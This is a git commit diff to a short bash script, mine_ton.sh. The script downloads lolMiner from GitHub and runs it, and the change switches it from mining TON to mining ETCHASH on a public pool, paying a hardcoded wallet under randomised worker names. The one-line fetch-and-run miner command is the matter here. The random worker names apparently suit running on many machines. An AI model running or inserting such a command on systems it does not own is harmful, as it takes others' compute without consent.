255e91365e3a5e2fdfb7ada669682a8d71e68f67
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-10 09:40:25 +0700

    Update mine_ton.sh

--- mine_ton.sh
+++ mine_ton.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xvf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo TON --pool wss://eu1.stratum.ton-pool.com/stratum --user EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xvf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+
 #################################
 ## Begin of user-editable part ##
 #################################
